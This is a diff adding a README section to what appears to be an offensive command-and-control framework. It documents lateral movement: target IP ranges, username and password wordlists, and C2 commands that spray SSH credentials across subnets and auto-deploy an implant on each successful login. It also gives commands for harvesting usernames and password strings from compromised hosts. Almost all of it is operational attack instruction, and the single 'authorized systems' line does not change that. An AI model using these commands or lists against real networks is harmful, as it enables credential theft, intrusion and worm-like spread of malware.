@@ -305,6 +305,196 @@ trigger_dnstunnel       # Start DNS tunneling
 
 ---
 
+##  Configuration Files for Lateral Movement
+
+### **Purpose**
+These files are used by the **SSH credential sprayer (`sshspray.py`)** and **auto-deploy (`autodeploy.py`)** payloads for automated lateral movement and network propagation.
+
+### **File Formats & Examples**
+
+#### **1. `targets.txt` - Target IP Addresses/Ranges**
+```txt
+# Single IP addresses
+192.168.1.100
+192.168.1.101
+192.168.1.102
+
+# IP ranges
+192.168.1.1-50
+10.0.0.1-255
+
+# CIDR notation
+192.168.1.0/24
+10.0.0.0/16
+
+# Hostnames (if DNS is available)
+server1.example.com
+server2.local
+```
+
+#### **2. `users.txt` - Username Dictionary**
+```txt
+# Common Linux usernames
+root
+admin
+ubuntu
+debian
+centos
+user
+test
+guest
+pi
+administrator
+sysadmin
+backup
+oracle
+postgres
+mysql
+www-data
+nobody
+
+# Add specific usernames from reconnaissance
+alice
+bob
+charlie
+david
+
+# Pattern-based usernames
+user1
+user2
+user3
+admin1
+admin2
+```
+
+#### **3. `passwords.txt` - Password Dictionary**
+```txt
+# Top passwords
+password
+123456
+admin
+password123
+qwerty
+12345678
+12345
+123456789
+letmein
+welcome
+monkey
+dragon
+baseball
+football
+hello
+
+# Common default credentials
+admin:admin
+root:toor
+ubuntu:ubuntu
+pi:raspberry
+
+# Empty password
+[blank]
+
+# Pattern-based
+Password1
+Admin123
+Test123
+```
+
+### **Usage Examples**
+
+#### **Manual SSH Spray Attack**
+```bash
+# From C2 web interface:
+trigger_sshspray 192.168.1.100 users.txt passwords.txt
+
+# Or manually:
+python3 ~/.cache/.rogue/sshspray.py 192.168.1.100 users.txt passwords.txt
+```
+
+#### **Auto-Deploy to Network**
+```bash
+# From C2 web interface:
+trigger_autodeploy
+
+# This will:
+# 1. Read targets.txt for IP ranges
+# 2. Scan for open SSH ports (22)
+# 3. Try users.txt usernames with passwords.txt
+# 4. Deploy implant on successful login
+```
+
+#### **Custom SSH Spray Command**
+```bash
+# Spray specific target with custom lists
+trigger_sshspray 10.0.0.50 custom_users.txt custom_passwords.txt
+
+# Spray entire subnet
+trigger_sshspray 192.168.1.0/24 users.txt passwords.txt
+```
+
+### **Advanced Configuration**
+
+#### **Creating Custom Lists from Reconnaissance**
+```bash
+# Extract usernames from /etc/passwd on compromised systems
+cat /etc/passwd | cut -d: -f1 > discovered_users.txt
+
+# Extract common passwords from system
+find /home -name "*.txt" -o -name "*.doc" -o -name "*.pdf" | xargs grep -i "password\|passwd\|pwd" 2>/dev/null | head -20
+
+# Create targeted password list based on organization
+echo "CompanyName2024" >> passwords.txt
+echo "SeasonYear!" >> passwords.txt  # e.g., Summer2024!
+```
+
+#### **Smart Target List Generation**
+```bash
+# Generate target list from network scan
+nmap -sn 192.168.1.0/24 -oG - | grep "Up" | cut -d" " -f2 > targets.txt
+
+# Combine multiple networks
+echo "192.168.1.1-254" > targets.txt
+echo "10.0.0.1-100" >> targets.txt
+echo "172.16.0.1-50" >> targets.txt
+```
+### **Best Practices**
+
+1. **Start Small**: Begin with limited targets and credentials
+2. **Use Rate Limiting**: Avoid account lockouts
+3. **Log Everything**: Keep records of attempts and successes
+4. **Update Regularly**: Add new credentials from compromised systems
+5. **Legal Compliance**: Only use on authorized systems
+
+### **Integration with Other Payloads**
+
+These files can also be used by:
+- **Network Scanner**: `targets.txt` for scan ranges
+- **Auto-Deploy**: All three files for automated propagation
+- **Custom Scripts**: As input for other lateral movement tools
+
+### **File Management Commands**
+```bash
+# View current configuration
+ls -la ~/rogue/payloads/*.txt
+
+# Count entries
+wc -l ~/rogue/payloads/targets.txt
+wc -l ~/rogue/payloads/users.txt
+wc -l ~/rogue/payloads/passwords.txt
+
+# Test file formatting
+head -10 ~/rogue/payloads/targets.txt
+head -10 ~/rogue/payloads/users.txt
+head -10 ~/rogue/payloads/passwords.txt
+
+# Clean up empty lines and comments
+sed -i '/^$/d' ~/rogue/payloads/targets.txt
+sed -i '/^#/d' ~/rogue/payloads/targets.txt
+```
+
+---
+
 ##  Advanced Usage
 
 ### **Compound Operations**
